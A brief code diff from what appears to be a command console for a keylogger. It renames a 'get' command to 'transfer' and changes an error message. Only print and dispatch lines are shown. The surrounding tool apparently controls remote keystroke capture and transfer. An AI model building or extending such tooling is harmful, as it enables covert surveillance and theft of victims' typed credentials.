@@ -153,8 +153,8 @@ if __name__ == "__main__":
                     print("Keylogger start command")
                 if argv[1] == STOP:
                     print("Keylogger stop command")
-                if argv[1] == GET:
-                    print("Keylogger get command")
+                if argv[1] == TRANSFER:
+                    print("Keylogger transfer command")
                 continue
             if argv[0] == WATCH:
                 print(f"watch {argv[1]}")
@@ -168,5 +168,5 @@ if __name__ == "__main__":
                 receive_response()
                 continue
         else:
-            print(f"Command not found: {command}")
+            print(f"Invalid Command: {command}")
     decode_process.kill()
